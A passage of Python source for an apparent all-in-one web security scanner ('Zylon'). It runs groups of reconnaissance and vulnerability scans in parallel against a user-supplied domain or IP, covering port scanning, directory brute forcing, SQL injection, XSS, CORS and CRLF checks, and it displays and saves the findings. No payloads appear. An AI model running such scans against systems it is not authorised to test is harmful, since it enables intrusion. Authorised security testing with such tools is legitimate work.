                        scan_result['status'] = 'completed'
                        scan_result['findings'] = findings_count
                        # Save JSON for this thread's results
                        try:
                            self.reports.save_json(thread_results, self.target)
                        except Exception:
                            pass
                    except Exception as e:
                        scan_result['status'] = 'error'
                        scan_result['error'] = str(e)

                    with lock:
                        progress.advance(task)

                    return scan_result

                with ThreadPoolExecutor(max_workers=max_workers) as executor:
                    futures = {executor.submit(_run_single_scan, sid): sid for sid in scan_ids}
                    for future in as_completed(futures):
                        result = future.result()
                        group_results.append(result)

            # Sort results by scan_id order
            scan_order = {sid: i for i, sid in enumerate(scan_ids)}
            group_results.sort(key=lambda r: scan_order.get(r['scan_id'], 999))

        else:
            # ========== SERIAL MODE (SAFE) ==========
            console.print(f"[bold cyan][*] SERIAL mode: 1 worker | {total} scans[/bold cyan]")

            with Progress(
                SpinnerColumn(),
                TextColumn("[bold blue]{task.description}[/bold blue]"),
                BarColumn(bar_width=40),
                TextColumn("[bold yellow]{task.completed}/{task.total}[/bold yellow]"),
                console=console
            ) as progress:
                task = progress.add_task(f"[cyan]{ginfo['name']}[/cyan]", total=total)

                for idx, scan_id in enumerate(scan_ids, 1):
                    scan_desc = self.SCAN_DESCRIPTIONS.get(scan_id, f'Scan {scan_id}')
                    progress.update(task, description=f"[cyan]{ginfo['name']} [{idx}/{total}] {scan_desc}[/cyan]")

                    scan_result = {
                        'scan_id': scan_id,
                        'scan_name': scan_desc,
                        'status': 'pending',
                        'findings': 0,
                        'error': None
                    }

                    try:
                        self.results = {'target': self.target, 'scan_type': scan_id,
                                       'timestamp': datetime.now().isoformat(), 'findings': {}}
                        self.run_scan(scan_id)
                        findings_count = len(self.results.get('findings', {}))
                        scan_result['status'] = 'completed'
                        scan_result['findings'] = findings_count
                    except Exception as e:
                        scan_result['status'] = 'error'
                        scan_result['error'] = str(e)

                    group_results.append(scan_result)
                    progress.advance(task)

        elapsed = time.time() - start_time

        # Display combined results
        self._display_group_results(group_id, ginfo, group_results, elapsed, parallel_mode)

    def _run_multi_groups(self, choice):
        """Run multiple groups (e.g. G1+G2+G5) — PARALLEL within each group"""
        group_ids = [g.strip() for g in choice.split('+') if g.strip() in self.SCAN_GROUPS]

        if not group_ids:
            console.print("[bold red][!] No valid groups found in input![/bold red]")
            return

        if not self.target:
            target = Prompt.ask("[bold yellow]Enter target domain/IP[/bold yellow]")
            success, msg = self.set_target(target)
            if not success:
                console.print(f"[bold red][!] {msg}[/bold red]")
                return
            console.print(f"[green][+] {msg}[/green]")

        # Calculate total scans
        total_scans = sum(len(self.SCAN_GROUPS[gid]['scans']) for gid in group_ids)
        group_names = ' + '.join([f"{self.SCAN_GROUPS[gid]['icon']} {gid}:{self.SCAN_GROUPS[gid]['name']}" for gid in group_ids])

        console.print(Panel(
            f"[bold yellow]MULTI-GROUP SCAN (PARALLEL)[/bold yellow]\n\n"
            f"[cyan]Groups:[/cyan] {group_names}\n"
            f"[cyan]Total Scans:[/cyan] {total_scans}\n"
            f"[cyan]Mode:[/cyan] PARALLEL (5 workers per group)\n"
            f"[cyan]Target:[/cyan] {self.target}",
            border_style="bright_yellow"
        ))

        confirm = Prompt.ask("[bold yellow]Start multi-group scan? (y/n)[/bold yellow]", default="y")
        if confirm.lower() != 'y':
            return

        all_results = {}
        start_time = time.time()

        # Run groups in parallel using ThreadPoolExecutor
        def _run_single_group(gid):
            ginfo = self.SCAN_GROUPS[gid]
            scan_ids = ginfo['scans']
            total = len(scan_ids)
            max_workers = min(total, 5)

            group_results = []
            lock = threading.Lock()

            def _run_scan_thread(scan_id):
                scan_desc = self.SCAN_DESCRIPTIONS.get(scan_id, f'Scan {scan_id}')
                scan_result = {
                    'scan_id': scan_id,
                    'scan_name': scan_desc,
                    'status': 'pending',
                    'findings': 0,
                    'error': None
                }
                try:
                    # Thread-safe: lock protects self.results swap+execute+restore
                    thread_results = {'target': self.target, 'scan_type': scan_id,
                                     'timestamp': datetime.now().isoformat(), 'findings': {}}
                    with lock:
                        saved_results = self.results
                        self.results = thread_results
                        try:
                            scan_map = self._build_scan_map()
                            scan_func = scan_map.get(scan_id)
                            if scan_func:
                                scan_func()
                            thread_results = dict(self.results)
                        finally:
                            self.results = saved_results
                    findings_count = len(thread_results.get('findings', {}))
                    scan_result['status'] = 'completed'
                    scan_result['findings'] = findings_count
                    try:
                        self.reports.save_json(thread_results, self.target)
                    except Exception:
                        pass
                except Exception as e:
                    scan_result['status'] = 'error'
                    scan_result['error'] = str(e)
                return scan_result

            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = {executor.submit(_run_scan_thread, sid): sid for sid in scan_ids}
                for future in as_completed(futures):
                    result = future.result()
                    group_results.append(result)

            # Sort by original order
            scan_order = {sid: i for i, sid in enumerate(scan_ids)}
            group_results.sort(key=lambda r: scan_order.get(r['scan_id'], 999))

            return gid, ginfo, group_results

        # Execute all groups in parallel
        with ThreadPoolExecutor(max_workers=min(len(group_ids), 3)) as group_executor:
            group_futures = {group_executor.submit(_run_single_group, gid): gid for gid in group_ids}
            for future in as_completed(group_futures):
                gid, ginfo, group_results = future.result()
                all_results[gid] = (ginfo, group_results)
                console.print(f"\n[bold green][+] Group {gid}: {ginfo['name']} completed[/bold green]")

        elapsed = time.time() - start_time

        # Display combined results for all groups
        self._display_multi_group_results(all_results, elapsed)

    def _run_all_groups(self):
        """Run ALL groups (GALL) — PARALLEL within each group"""
        if not self.target:
            target = Prompt.ask("[bold yellow]Enter target domain/IP[/bold yellow]")
            success, msg = self.set_target(target)
            if not success:
                console.print(f"[bold red][!] {msg}[/bold red]")
                return
            console.print(f"[green][+] {msg}[/green]")

        total_scans = sum(len(g['scans']) for g in self.SCAN_GROUPS.values())

        console.print(Panel(
            f"[bold red]MEGA GROUP SCAN - ALL 51 GROUPS (PARALLEL)[/bold red]\n\n"
            f"[bold yellow]WARNING: This will run {total_scans} scans![/bold yellow]\n"
            f"[cyan]Target:[/cyan] {self.target}\n"
            f"[cyan]Mode:[/cyan] PARALLEL (5 workers per group)\n"
            f"[cyan]Estimated Time:[/cyan] {total_scans * 5 // 60}+ minutes (parallel speedup)",
            border_style="bright_red",
            box=box.HEAVY
        ))

        confirm = Prompt.ask("[bold red]Run ALL groups? This will take a LONG time! (y/n)[/bold red]", default="n")
        if confirm.lower() != 'y':
            return

        all_results = {}
        start_time = time.time()
        completed_groups = 0
        total_groups = len(self.SCAN_GROUPS)

        # Run all groups in parallel (3 groups concurrently)
        def _run_single_group_mega(gid, ginfo, group_num):
            scan_ids = ginfo['scans']
            total = len(scan_ids)
            max_workers = min(total, 5)

            console.print(f"\n[bold cyan][{group_num}/{total_groups}] Group {gid}: {ginfo['name']} — PARALLEL ({max_workers} workers)[/bold cyan]")

            group_results = []
            lock = threading.Lock()

            def _run_scan_mega(scan_id):
                scan_desc = self.SCAN_DESCRIPTIONS.get(scan_id, f'Scan {scan_id}')
                scan_result = {
                    'scan_id': scan_id,
                    'scan_name': scan_desc,
                    'status': 'pending',
                    'findings': 0,
                    'error': None
                }
                try:
                    # Thread-safe: lock protects self.results swap+execute+restore
                    thread_results = {'target': self.target, 'scan_type': scan_id,
                                     'timestamp': datetime.now().isoformat(), 'findings': {}}
                    with lock:
                        saved_results = self.results
                        self.results = thread_results
                        try:
                            scan_map = self._build_scan_map()
                            scan_func = scan_map.get(scan_id)
                            if scan_func:
                                scan_func()
                            thread_results = dict(self.results)
                        finally:
                            self.results = saved_results
                    findings_count = len(thread_results.get('findings', {}))
                    scan_result['status'] = 'completed'
                    scan_result['findings'] = findings_count
                    try:
                        self.reports.save_json(thread_results, self.target)
                    except Exception:
                        pass
                except Exception as e:
                    scan_result['status'] = 'error'
                    scan_result['error'] = str(e)
                return scan_result

            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = {executor.submit(_run_scan_mega, sid): sid for sid in scan_ids}
                for future in as_completed(futures):
                    result = future.result()
                    group_results.append(result)

            # Sort by original order
            scan_order = {sid: i for i, sid in enumerate(scan_ids)}
            group_results.sort(key=lambda r: scan_order.get(r['scan_id'], 999))

            return gid, ginfo, group_results

        # Execute all groups with parallel group execution (3 groups at a time)
        with ThreadPoolExecutor(max_workers=3) as group_executor:
            group_futures = {}
            for idx, (gid, ginfo) in enumerate(self.SCAN_GROUPS.items(), 1):
                group_futures[group_executor.submit(_run_single_group_mega, gid, ginfo, idx)] = gid
            for future in as_completed(group_futures):
                gid, ginfo, group_results = future.result()
                all_results[gid] = (ginfo, group_results)
                completed_groups += 1
                console.print(f"[bold green][{completed_groups}/{total_groups}] Group {gid} done[/bold green]")

        elapsed = time.time() - start_time
        self._display_multi_group_results(all_results, elapsed, is_mega=True)

    def _display_group_results(self, group_id, ginfo, group_results, elapsed, parallel_mode='parallel'):
        """Display combined results for a single group"""
        completed = sum(1 for r in group_results if r['status'] == 'completed')
        errors = sum(1 for r in group_results if r['status'] == 'error')
        total_findings = sum(r['findings'] for r in group_results)

        mode_label = 'PARALLEL' if parallel_mode == 'parallel' else 'SERIAL'

        # Header
        console.print(Panel(
            f"[{ginfo['color']}]{ginfo['icon']} GROUP {group_id}: {ginfo['name']} — COMBINED RESULTS[/{ginfo['color']}]\n\n"
            f"[cyan]Target:[/cyan] {self.target}\n"
            f"[cyan]Total Scans:[/cyan] {len(group_results)}\n"
            f"[cyan]Mode:[/cyan] {mode_label}\n"
            f"[green]Completed:[/green] {completed}\n"
            f"[red]Errors:[/red] {errors}\n"
            f"[yellow]Total Findings:[/yellow] {total_findings}\n"
            f"[dim]Time: {elapsed:.1f}s[/dim]",
            title="[bold white] GROUP RESULTS [/bold white]",
            border_style="bright_green",
            box=box.HEAVY
        ))

        # Results table
        results_table = Table(
            title=f"[bold yellow]{ginfo['icon']} {ginfo['name']} — Scan Results[/bold yellow]",
            box=box.ROUNDED,
            border_style="bright_magenta",
            show_lines=True
        )
        results_table.add_column("Scan ID", style="bold cyan", width=8)
        results_table.add_column("Scan Name", style="white", width=22)
        results_table.add_column("Status", style="bold", width=12)
        results_table.add_column("Findings", style="bold yellow", width=10, justify="center")

        for r in group_results:
            if r['status'] == 'completed':
                status = "[green]FOUND[/green]" if r['findings'] > 0 else "[dim]Clean[/dim]"
            elif r['status'] == 'error':
                status = "[red]ERROR[/red]"
            else:
                status = "[yellow]SKIP[/yellow]"

            findings_str = str(r['findings']) if r['findings'] > 0 else "-"
            results_table.add_row(
                f"[{r['scan_id']}]",
                r['scan_name'],
                status,
                findings_str
            )

        console.print(results_table)

        # Summary
        found_scans = [r for r in group_results if r['findings'] > 0]
        if found_scans:
            console.print(f"\n[bold green][+] Vulnerabilities found in {len(found_scans)}/{len(group_results)} scans![/bold green]")
            for r in found_scans:
                console.print(f"    [yellow][{r['scan_id']}] {r['scan_name']}[/yellow] → [bold red]{r['findings']} findings[/bold red]")
        else:
            console.print(f"\n[bold green][+] No vulnerabilities found in {ginfo['name']} group.[/bold green]")

        # Save group results
        self._save_group_results(group_id, ginfo, group_results, elapsed)

    def _display_multi_group_results(self, all_results, elapsed, is_mega=False):
        """Display combined results for multiple groups"""
        total_scans = sum(len(results) for _, (_, results) in all_results.items())
        total_completed = sum(1 for _, (_, results) in all_results.items() for r in results if r['status'] == 'completed')
        total_errors = sum(1 for _, (_, results) in all_results.items() for r in results if r['status'] == 'error')
        total_findings = sum(r['findings'] for _, (_, results) in all_results.items() for r in results)

        title = "MEGA GROUP SCAN — ALL 51 GROUPS" if is_mega else "MULTI-GROUP SCAN — COMBINED RESULTS"

        console.print(Panel(
            f"[bold red]{title}[/bold red]\n\n"
            f"[cyan]Target:[/cyan] {self.target}\n"
            f"[cyan]Groups Scanned:[/cyan] {len(all_results)}\n"
            f"[cyan]Total Scans:[/cyan] {total_scans}\n"
            f"[green]Completed:[/green] {total_completed}\n"
            f"[red]Errors:[/red] {total_errors}\n"
            f"[bold yellow]Total Findings:[/bold yellow] {total_findings}\n"
            f"[dim]Total Time: {elapsed:.1f}s[/dim]",
            title="[bold white] COMBINED GROUP RESULTS [/bold white]",
            border_style="bright_red",
            box=box.HEAVY
        ))

        # Group-by-group summary table
        summary_table = Table(
            title="[bold yellow]Group Summary[/bold yellow]",
            box=box.ROUNDED,
            border_style="bright_magenta",
            show_lines=True
        )
        summary_table.add_column("Group", style="bold cyan", width=8)
        summary_table.add_column("Category", style="white", width=22)
        summary_table.add_column("Scans", style="yellow", width=7, justify="center")
        summary_table.add_column("Completed", style="green", width=10, justify="center")
        summary_table.add_column("Errors", style="red", width=7, justify="center")
        summary_table.add_column("Findings", style="bold yellow", width=10, justify="center")

        for gid, (ginfo, results) in all_results.items():
            comp = sum(1 for r in results if r['status'] == 'completed')
            errs = sum(1 for r in results if r['status'] == 'error')
            finds = sum(r['findings'] for r in results)
            summary_table.add_row(
                f"{ginfo['icon']} {gid}",
                ginfo['name'],
                str(len(results)),
                str(comp),
                str(errs),
                str(finds) if finds > 0 else "-"
            )

        console.print(summary_table)

        # Detailed findings
        all_found = []
        for gid, (ginfo, results) in all_results.items():
            for r in results:
                if r['findings'] > 0:
                    all_found.append((gid, ginfo['name'], r))

        if all_found:
            console.print(f"\n[bold green][+] VULNERABILITIES FOUND in {len(all_found)} scans![/bold green]")
            detail_table = Table(
                title="[bold red]Detailed Findings[/bold red]",
                box=box.ROUNDED,
                border_style="bright_red"
            )
            detail_table.add_column("Group", style="cyan", width=8)
            detail_table.add_column("Category", style="white", width=18)
            detail_table.add_column("Scan ID", style="yellow", width=8)
            detail_table.add_column("Scan Name", style="white", width=20)
            detail_table.add_column("Findings", style="bold red", width=10, justify="center")

            for gid, gname, r in all_found:
                detail_table.add_row(gid, gname, f"[{r['scan_id']}]", r['scan_name'], str(r['findings']))

            console.print(detail_table)
        else:
            console.print(f"\n[bold green][+] No vulnerabilities found across all groups![/bold green]")

    def _save_group_results(self, group_id, ginfo, group_results, elapsed):
        """Save group scan results to file"""
        try:
            reports_dir = os.path.join(get_home(), '.zylon', 'group_reports')
            os.makedirs(reports_dir, exist_ok=True)

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"group_{group_id}_{self.target.replace('.', '_')}_{timestamp}.json"
            filepath = os.path.join(reports_dir, filename)

            report = {
                'group_id': group_id,
                'group_name': ginfo['name'],
                'target': self.target,
                'timestamp': datetime.now().isoformat(),
                'elapsed_seconds': round(elapsed, 2),
                'total_scans': len(group_results),
                'completed': sum(1 for r in group_results if r['status'] == 'completed'),
                'errors': sum(1 for r in group_results if r['status'] == 'error'),
                'total_findings': sum(r['findings'] for r in group_results),
                'results': group_results
            }

            with open(filepath, 'w') as f:
                json.dump(report, f, indent=2, default=str)

            console.print(f"[dim][*] Group report saved: {filepath}[/dim]")
        except Exception as e:
            console.print(f"[dim][!] Could not save group report: {e}[/dim]")

    # ========================================================================
    # SCAN IMPLEMENTATIONS
    # ========================================================================
    
    def _scan_full_recon(self):
        """Full Reconnaissance - omino's recon + wizard's basic recon combined"""
        console.print(f"\n[bold cyan][*] Full Reconnaissance on {self.target}[/bold cyan]")
        
        url = f"{self.protocol}{self.target}"
        
        with console.status("[bold cyan]Gathering intelligence...[/bold cyan]"):
            # Phase 1: Basic info
            title = self.recon.get_title(url)
            ip = self.network.resolve_ip(self.target)
            geo = self.network.get_geolocation(ip) if ip else None
            cms = self.recon.detect_cms(url)
            cloudflare = self.recon.check_cloudflare(ip, url) if ip else False
            robots = self.recon.analyze_robots(url)
            headers = self.web.analyze_security_headers(url)
            dns_records = self.network.dns_lookup(self.target)
            
        self.results['findings']['recon'] = {
            'title': title,
            'ip': ip,
            'geolocation': geo,
            'cms': cms,
            'cloudflare': cloudflare,
            'robots_txt': robots,
            'security_headers': headers,
            'dns_records': dns_records
        }
        
        # Display results
        recon_table = Table(title=f"[bold]Reconnaissance Results: {self.target}[/bold]",
                          box=box.ROUNDED, border_style="bright_cyan")
        recon_table.add_column("Property", style="yellow")
        recon_table.add_column("Value", style="green")
        
        recon_table.add_row("Page Title", str(title))
        recon_table.add_row("IP Address", str(ip))
        recon_table.add_row("CMS", str(cms))
        recon_table.add_row("Cloudflare", "Yes" if cloudflare else "No")
        if geo:
            recon_table.add_row("Country", geo.get('country', 'Unknown'))
            recon_table.add_row("City", geo.get('city', 'Unknown'))
            recon_table.add_row("ISP", geo.get('isp', 'Unknown'))
        
        console.print(recon_table)
        
        # DNS Records
        if dns_records and 'error' not in dns_records:
            dns_table = Table(title="DNS Records", box=box.ROUNDED, border_style="cyan")
            dns_table.add_column("Type", style="yellow")
            dns_table.add_column("Value", style="green")
            for rtype, values in dns_records.items():
                if isinstance(values, list):
                    for val in values[:5]:
                        dns_table.add_row(rtype, val)
            console.print(dns_table)
        
        # Security Headers
        if headers:
            h_table = Table(title="Security Headers", box=box.ROUNDED, border_style="red")
            h_table.add_column("Header", style="yellow")
            h_table.add_column("Status", style="green")
            h_table.add_column("Score Impact", style="red")
            for hname, hval in headers.get('security_headers', {}).items():
                status = "Present" if hval.get('value') != 'Missing' else "Missing"
                impact = f"-{hval.get('weight', 0)}pts"
                h_table.add_row(hname, status, impact)
            console.print(h_table)
            console.print(f"[bold yellow]Security Header Score: {headers.get('security_score', 0)}/100[/bold yellow]")
    
    def _scan_whois(self):
        """WHOIS Domain Lookup"""
        console.print(f"\n[bold cyan][*] WHOIS Lookup on {self.target}[/bold cyan]")
        
        with console.status("[bold cyan]Querying WHOIS records...[/bold cyan]"):
            result = self.recon.whois_lookup(self.target)
        
        self.results['findings']['whois'] = result
        
        if result and 'error' not in result:
            w_table = Table(title="WHOIS Information", box=box.ROUNDED, border_style="cyan")
            w_table.add_column("Field", style="yellow")
            w_table.add_column("Value", style="green")
            for key, val in result.items():
                if val and key not in ['raw']:
                    w_table.add_row(key, str(val)[:80])
            console.print(w_table)
        else:
            console.print(f"[bold yellow][!] WHOIS lookup failed: {result.get('error', 'Unknown error')}[/bold yellow]")
    
    def _scan_geoip(self):
        """Geo-IP Location"""
        console.print(f"\n[bold cyan][*] Geo-IP Lookup on {self.target}[/bold cyan]")
        
        with console.status("[bold cyan]Locating server...[/bold cyan]"):
            ip = self.network.resolve_ip(self.target)
            geo = self.network.get_geolocation(ip) if ip else None
        
        self.results['findings']['geoip'] = {'ip': ip, 'geo': geo}
        
        if geo:
            g_table = Table(title="Geo-IP Information", box=box.ROUNDED, border_style="green")
            g_table.add_column("Property", style="yellow")
            g_table.add_column("Value", style="green")
            g_table.add_row("IP", str(ip))
            g_table.add_row("Country", geo.get('country', 'Unknown'))
            g_table.add_row("City", geo.get('city', 'Unknown'))
            g_table.add_row("Region", geo.get('regionName', 'Unknown'))
            g_table.add_row("ISP", geo.get('isp', 'Unknown'))
            g_table.add_row("Organization", geo.get('org', 'Unknown'))
            g_table.add_row("Latitude", str(geo.get('lat', 'N/A')))
            g_table.add_row("Longitude", str(geo.get('lon', 'N/A')))
            g_table.add_row("Timezone", geo.get('timezone', 'Unknown'))
            console.print(g_table)
        else:
            console.print("[bold red][!] Geo-IP lookup failed[/bold red]")
    
    def _scan_dns(self):
        """DNS Records Enumeration"""
        console.print(f"\n[bold cyan][*] DNS Enumeration on {self.target}[/bold cyan]")
        
        with console.status("[bold cyan]Querying DNS records...[/bold cyan]"):
            dns_records = self.network.dns_lookup(self.target)
        
        self.results['findings']['dns'] = dns_records
        
        if dns_records and 'error' not in dns_records:
            d_table = Table(title="DNS Records", box=box.DOUBLE, border_style="bright_cyan")
            d_table.add_column("Type", style="bold yellow")
            d_table.add_column("Value", style="green")
            for rtype, values in dns_records.items():
                if isinstance(values, list):
                    for val in values:
                        d_table.add_row(rtype, val)
            console.print(d_table)
    
    def _scan_subdomains(self):
        """Multi-Source Subdomain Discovery"""
        console.print(f"\n[bold cyan][*] Subdomain Discovery on {self.target}[/bold cyan]")
        
        with console.status("[bold cyan]Discovering subdomains (crt.sh, dns.bufferover.run, rapiddns)...[/bold cyan]"):
            subdomains = self.recon.discover_subdomains(self.target)
        
        self.results['findings']['subdomains'] = subdomains
        
        if subdomains:
            s_table = Table(title=f"Subdomains Found: {len(subdomains)}", box=box.ROUNDED, border_style="green")
            s_table.add_column("#", style="dim")
            s_table.add_column("Subdomain", style="cyan")
            s_table.add_column("Source", style="yellow")
            for i, sub in enumerate(sorted(subdomains)[:100], 1):
                source = subdomains[sub] if isinstance(subdomains, dict) else 'multi'
                s_table.add_row(str(i), sub, str(source))
            console.print(s_table)
            if len(subdomains) > 100:
                console.print(f"[yellow]... and {len(subdomains) - 100} more subdomains[/yellow]")
        else:
            console.print("[bold yellow][!] No subdomains found[/bold yellow]")
    
    def _scan_ports(self):
        """Port Scanner - Connect Scan (No Root Required)"""
        console.print(f"\n[bold cyan][*] Port Scanning {self.target}[/bold cyan]")
        
        ip = self.network.resolve_ip(self.target)
        if not ip:
            console.print("[bold red][!] Cannot resolve target[/bold red]")
            return
        
        with console.status("[bold cyan]Scanning ports (connect scan - no root needed)...[/bold cyan]"):
            open_ports = self.network.port_scan(ip)
        
        self.results['findings']['ports'] = open_ports
        
        if open_ports:
            p_table = Table(title=f"Open Ports: {len(open_ports)}", box=box.ROUNDED, border_style="red")
            p_table.add_column("Port", style="bold red")
            p_table.add_column("Service", style="cyan")
            p_table.add_column("State", style="green")
            for port, info in sorted(open_ports.items()):
                p_table.add_row(str(port), info.get('service', 'unknown'), 'open')
            console.print(p_table)
        else:
            console.print("[bold yellow][!] No open ports found (target may be firewalled)[/bold yellow]")
    
    def _scan_banners(self):
        """Banner Grabbing"""
        console.print(f"\n[bold cyan][*] Banner Grabbing on {self.target}[/bold cyan]")
        
        with console.status("[bold cyan]Grabbing banners...[/bold cyan]"):
            banners = self.network.banner_grab(self.target)
        
        self.results['findings']['banners'] = banners
        
        if banners:
            b_table = Table(title="Service Banners", box=box.ROUNDED, border_style="cyan")
            b_table.add_column("Port", style="yellow")
            b_table.add_column("Banner", style="green")
            for port, banner in banners.items():
                b_table.add_row(str(port), str(banner)[:100])
            console.print(b_table)
    
    def _scan_headers(self):
        """HTTP Security Headers Analysis"""
        console.print(f"\n[bold cyan][*] Security Headers Analysis on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        
        with console.status("[bold cyan]Analyzing HTTP headers...[/bold cyan]"):
            result = self.web.analyze_security_headers(url)
        
        self.results['findings']['headers'] = result
        
        if result:
            h_table = Table(title="Security Headers Analysis", box=box.DOUBLE, border_style="red")
            h_table.add_column("Header", style="yellow")
            h_table.add_column("Status", style="bold")
            h_table.add_column("Value/Recommendation", style="cyan")
            for hname, hval in result.get('security_headers', {}).items():
                status = "[green]Present[/green]" if hval.get('value') != 'Missing' else "[red]Missing[/red]"
                val = str(hval.get('value', ''))[:60] if hval.get('value') != 'Missing' else hval.get('recommended', '')
                h_table.add_row(hname, status, val)
            console.print(h_table)
            console.print(f"\n[bold]Security Header Score: [yellow]{result.get('security_score', 0)}/100[/yellow][/bold]")
            
            recs = result.get('recommendations', [])
            if recs:
                console.print("\n[bold red]Recommendations:[/bold red]")
                for rec in recs:
                    console.print(f"  [red]*[/red] {rec}")
    
    def _scan_ssl(self):
        """SSL/TLS Certificate Analysis"""
        console.print(f"\n[bold cyan][*] SSL/TLS Analysis on {self.target}[/bold cyan]")
        
        with console.status("[bold cyan]Analyzing SSL certificate...[/bold cyan]"):
            result = self.network.ssl_analyze(self.target)
        
        self.results['findings']['ssl'] = result
        
        if result:
            s_table = Table(title="SSL/TLS Analysis", box=box.ROUNDED, border_style="green")
            s_table.add_column("Property", style="yellow")
            s_table.add_column("Value", style="green")
            for key, val in result.items():
                if key != 'raw_cert':
                    s_table.add_row(key, str(val)[:80])
            console.print(s_table)
            
            if result.get('issues'):
                console.print("\n[bold red]SSL Issues Found:[/bold red]")
                for issue in result['issues']:
                    console.print(f"  [red]*[/red] {issue}")
    
    def _scan_sqli(self):
        """SQL Injection Scanner"""
        console.print(f"\n[bold cyan][*] SQL Injection Scan on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        
        with console.status("[bold cyan]Testing for SQL injection vulnerabilities...[/bold cyan]"):
            result = self.vuln.scan_sqli(url)
        
        self.results['findings']['sqli'] = result
        
        if result and result.get('vulnerable'):
            v_table = Table(title="SQL Injection Vulnerabilities Found!", box=box.HEAVY, border_style="bold red")
            v_table.add_column("URL", style="red")
            v_table.add_column("Parameter", style="yellow")
            v_table.add_column("Payload", style="cyan")
            v_table.add_column("Evidence", style="green")
            for finding in result.get('findings', []):
                v_table.add_row(
                    finding.get('url', '')[:50],
                    finding.get('parameter', ''),
                    finding.get('payload', '')[:40],
                    finding.get('evidence', '')[:40]
                )
            console.print(v_table)
        else:
            console.print("[bold green][+] No SQL injection vulnerabilities detected[/bold green]")
    
    def _scan_xss(self):
        """XSS Scanner"""
        console.print(f"\n[bold cyan][*] XSS Scan on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        
        with console.status("[bold cyan]Testing for XSS vulnerabilities...[/bold cyan]"):
            result = self.vuln.scan_xss(url)
        
        self.results['findings']['xss'] = result
        
        if result and result.get('vulnerable'):
            x_table = Table(title="XSS Vulnerabilities Found!", box=box.HEAVY, border_style="bold red")
            x_table.add_column("URL", style="red")
            x_table.add_column("Parameter", style="yellow")
            x_table.add_column("Payload", style="cyan")
            for finding in result.get('findings', []):
                x_table.add_row(
                    finding.get('url', '')[:50],
                    finding.get('parameter', ''),
                    finding.get('payload', '')[:40]
                )
            console.print(x_table)
        else:
            console.print("[bold green][+] No XSS vulnerabilities detected[/bold green]")
    
    def _scan_dirbrute(self):
        """Directory Brute Force"""
        console.print(f"\n[bold cyan][*] Directory Brute Force on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        
        with console.status("[bold cyan]Brute forcing directories...[/bold cyan]"):
            result = self.web.directory_bruteforce(url)
        
        self.results['findings']['directories'] = result
        
        if result:
            d_table = Table(title=f"Discovered Paths: {len(result)}", box=box.ROUNDED, border_style="cyan")
            d_table.add_column("Path", style="yellow")
            d_table.add_column("Status", style="green")
            d_table.add_column("Size", style="cyan")
            for path, info in sorted(result.items()):
                status_color = "green" if info.get('status') == 200 else "yellow" if info.get('status') in [301, 302, 403] else "red"
                d_table.add_row(path, f"[{status_color}]{info.get('status')}[/{status_color}]", str(info.get('size', '')))
            console.print(d_table)
    
    def _scan_wordpress(self):
        """WordPress Security Scan"""
        console.print(f"\n[bold cyan][*] WordPress Scan on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        
        with console.status("[bold cyan]Scanning WordPress installation...[/bold cyan]"):
            result = self.vuln.scan_wordpress(url)
        
        self.results['findings']['wordpress'] = result
        
        if result:
            w_table = Table(title="WordPress Scan Results", box=box.ROUNDED, border_style="cyan")
            w_table.add_column("Check", style="yellow")
            w_table.add_column("Result", style="green")
            for check, val in result.items():
                w_table.add_row(check, str(val)[:80])
            console.print(w_table)
    
    def _scan_cors(self):
        """CORS Misconfiguration Detector - Zylon Custom"""
        console.print(f"\n[bold cyan][*] CORS Misconfiguration Scan on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        
        with console.status("[bold cyan]Testing CORS configurations...[/bold cyan]"):
            result = self.vuln.scan_cors(url)
        
        self.results['findings']['cors'] = result
        
        if result and result.get('misconfigured'):
            console.print("[bold red][!] CORS Misconfiguration Detected![/bold red]")
            c_table = Table(title="CORS Issues", box=box.HEAVY, border_style="red")
            c_table.add_column("Origin", style="yellow")
            c_table.add_column("ACAO Header", style="cyan")
            c_table.add_column("Risk", style="red")
            for finding in result.get('findings', []):
                c_table.add_row(
                    finding.get('origin', ''),
                    finding.get('acao', ''),
                    finding.get('risk', '')
                )
            console.print(c_table)
        else:
            console.print("[bold green][+] CORS configuration appears secure[/bold green]")
    
    def _scan_openredirect(self):
        """Open Redirect Detector - Zylon Custom"""
        console.print(f"\n[bold cyan][*] Open Redirect Scan on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        
        with console.status("[bold cyan]Testing for open redirects...[/bold cyan]"):
            result = self.vuln.scan_open_redirect(url)
        
        self.results['findings']['open_redirect'] = result
        
        if result and result.get('vulnerable'):
            console.print("[bold red][!] Open Redirect Vulnerability Detected![/bold red]")
            for finding in result.get('findings', []):
                console.print(f"  [red]*[/red] URL: {finding.get('url', '')}")
                console.print(f"  [red]*[/red] Redirects to: {finding.get('redirects_to', '')}")
        else:
            console.print("[bold green][+] No open redirect vulnerabilities detected[/bold green]")
    
    def _scan_crlf(self):
        """CRLF Injection Scanner - Zylon Custom"""
        console.print(f"\n[bold cyan][*] CRLF Injection Scan on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        
        with console.status("[bold cyan]Testing for CRLF injection...[/bold cyan]"):
            result = self.vuln.scan_crlf(url)
        
        self.results['findings']['crlf'] = result
        
        if result and result.get('vulnerable'):
            console.print("[bold red][!] CRLF Injection Detected![/bold red]")
            for finding in result.get('findings', []):
                console.print(f"  [red]*[/red] URL: {finding.get('url', '')}")
        else:
            console.print("[bold green][+] No CRLF injection vulnerabilities detected[/bold green]")
    
    def _scan_cookies(self):
        """Cookie Security Analyzer - Zylon Custom"""
        console.print(f"\n[bold cyan][*] Cookie Security Analysis on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        
        with console.status("[bold cyan]Analyzing cookie security...[/bold cyan]"):
            result = self.web.analyze_cookies(url)
        
        self.results['findings']['cookies'] = result
        
        if result:
            c_table = Table(title="Cookie Analysis", box=box.ROUNDED, border_style="yellow")
            c_table.add_column("Cookie", style="yellow")
            c_table.add_column("Secure", style="green")
            c_table.add_column("HttpOnly", style="green")
            c_table.add_column("SameSite", style="green")
            c_table.add_column("Issues", style="red")
            for cookie, info in result.items():
                issues = ', '.join(info.get('issues', []))
                c_table.add_row(
